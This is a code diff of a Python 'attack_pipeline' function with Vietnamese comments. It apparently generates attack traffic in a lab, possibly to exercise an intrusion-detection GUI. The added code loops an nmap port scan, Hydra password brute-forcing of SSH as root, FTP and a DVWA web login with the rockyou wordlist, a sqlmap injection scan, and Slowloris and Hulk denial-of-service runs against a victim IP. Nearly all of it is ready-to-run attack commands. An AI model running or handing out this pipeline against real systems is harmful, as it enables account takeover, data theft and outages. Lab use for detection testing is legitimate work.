@@ -24,29 +24,61 @@ def attack_pipeline():
     round_num = 1
     while True:
         print(f"\n{'='*50}")
-        print(f"--- BẮT ĐẦU ĐỢT TẤN CÔNG SỐ {round_num} ---")
+        print(f"--- ĐỢT TẤN CÔNG {round_num} ---")
         print(f"{'='*50}")
 
-        # Bước 1: Port Scan (Quét cổng)
-        # BẮT BUỘC DÙNG -sT (TCP Connect) thay vì -sS (SYN Scan) để tránh lỗi rơi gói tin do NAT của Windows 10 WSL
-        run_command(f"sudo nmap -sT -T4 -p 1-1000 {VICTIM_IP}", "Quét 1000 cổng đầu tiên bằng chế độ TCP Connect (Nmap)")
-        time.sleep(10) # Nghỉ 10s cho GUI hiển thị
-
-        # Bước 2: Brute Force Web
-        if os.path.exists("/usr/share/wordlists/rockyou.txt"):
-            run_command(f"timeout 30s hydra -l admin -P /usr/share/wordlists/rockyou.txt {VICTIM_IP} http-get /login.php", "Web Brute Force 30s")
-        else:
-            run_command(f"timeout 30s hydra -l admin -p password123 {VICTIM_IP} http-get /login.php", "Web Brute Force (Mini)")
+        # 1. PortScan
+        run_command(f"sudo nmap -sT -T4 -p 1-1000 {VICTIM_IP}", "PortScan")
         time.sleep(10)
 
-        # Bước 3: Tấn công DoS (Slowloris)
-        print("\n[ATTACK] Kích hoạt DoS Slowloris. Chạy trong 30 giây...")
-        try:
-            subprocess.run(f"timeout 30s slowloris {VICTIM_IP} -p 80 -s 200", shell=True)
-        except Exception as e:
-            pass
-        
-        print(f"\n--- ĐÃ XONG ĐỢT TẤN CÔNG {round_num}. NGHỈ 20 GIÂY ĐỂ GUI LÀM DỊU... ---")
+        # 2. SSH Brute Force
+        run_command(
+            f"timeout 30s hydra -l root -P /usr/share/wordlists/rockyou.txt "
+            f"ssh://{VICTIM_IP} -t 4 -f",
+            "SSH Brute Force"
+        )
+        time.sleep(10)
+
+        # 3. FTP Brute Force
+        run_command(
+            f"timeout 30s hydra -l admin -P /usr/share/wordlists/rockyou.txt "
+            f"ftp://{VICTIM_IP} -t 4 -f",
+            "FTP Brute Force"
+        )
+        time.sleep(10)
+
+        # 4. Web Brute Force (giữ nguyên)
+        run_command(
+            f"timeout 30s hydra -l admin -P /usr/share/wordlists/rockyou.txt "
+            f"{VICTIM_IP} http-get /DVWA/login.php",
+            "Web Brute Force"
+        )
+        time.sleep(10)
+
+        # 5. SQL Injection
+        run_command(
+            f"sqlmap -u 'http://{VICTIM_IP}/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit' "
+            f"--cookie='security=low' --batch --dbs --level=1 --risk=1",
+            "SQL Injection Scan"
+        )
+        time.sleep(10)
+
+        # 6. DoS Slowloris (giữ nguyên)
+        run_command(
+            f"timeout 30s slowloris {VICTIM_IP} -p 80 -s 200",
+            "DoS Slowloris"
+        )
+        time.sleep(10)
+
+        # 7. DoS Hulk (cần clone script trước)
+        if os.path.exists("/opt/hulk/hulk.py"):
+            run_command(
+                f"timeout 30s python3 /opt/hulk/hulk.py http://{VICTIM_IP}",
+                "DoS Hulk"
+            )
+            time.sleep(10)
+
+        print(f"\n--- XONG ĐỢT {round_num}. NGHỈ 20 GIÂY ĐỂ GUI LÀM DỊU... ---")
         time.sleep(20)
         round_num += 1
 
